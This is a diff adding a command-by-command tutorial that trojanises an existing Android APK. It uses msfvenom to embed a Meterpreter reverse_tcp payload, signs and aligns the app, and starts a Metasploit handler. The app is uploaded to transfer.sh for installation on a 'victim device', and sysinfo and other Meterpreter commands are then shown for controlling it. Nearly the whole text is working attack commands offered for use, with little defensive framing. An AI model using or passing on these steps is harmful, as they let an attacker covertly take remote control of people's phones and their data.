@@ -1,0 +1,70 @@
+//Run terminal
+//Put existing any app below 1.0 in desktop
+root@kali:cd /root/Desktop
+
+//locate existing app
+root@kali:/root/Desktop# sudo msfvenom --arch dalvik --platform Android -x sample.apk -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -o android.apk
+
+//LHOST= Put your system IP address
+
+root@kali:/root/Desktop# ifconfig
+//Command used to find system ip address
+
+//sample.apk is existing apk name
+//android.apk is output apk
+
+//keytool 
+root@kali:/root/Desktop# keytool -genkey -V -keystore key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
+//here hacked is a domain
+
+//jarsigner-signed certifications & Verify
+root@kali:/root/Desktop# jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore android.apk hacked
+
+root@kali:/root/Desktop# jarsigner -verify -verbose -certs android.apk
+
+//zipalign align apk files
+root@kali:/root/Desktop# zipalign -v 4 android.apk finaloutput.apk
+
+//Starting Metasploit
+//run msfconsole (metasploit framework) to Handle exploit
+root@kali:/root/Desktop# msfconsole
+msf5> use exploit/multi/handler
+
+msf5> set payload android/meterpreter/reverse_tcp
+
+msf5> set LHOST 192.168.0.1
+//LHOST= Put your same apk system IP address
+
+msf5> set LPORT 4444
+
+msf5>exploit
+//wait for app to be open
+//Go to line 56
+
+//Once your app is opened, you recieve meterpreter
+meterpreter >
+
+//type following command to show your victim device details
+meterpreter > sysinfo
+
+//type help for more
+meterpreter > help
+
+//now you can access your android devices
+
+
+====================================================================================================================================================================
+//open newtab in terminal
+//upload your apk over using link 
+root@kali:/root/Desktop# curl --upload-file finaloutput.apk https://transfer.sh/finaloutput.apk
+
+//wait for link generated and out the link in android device or emulator
+//install the apk file and run.
+//done:)
+
+//Thanks for reading this. Your awesome.
+
+
+
+
+
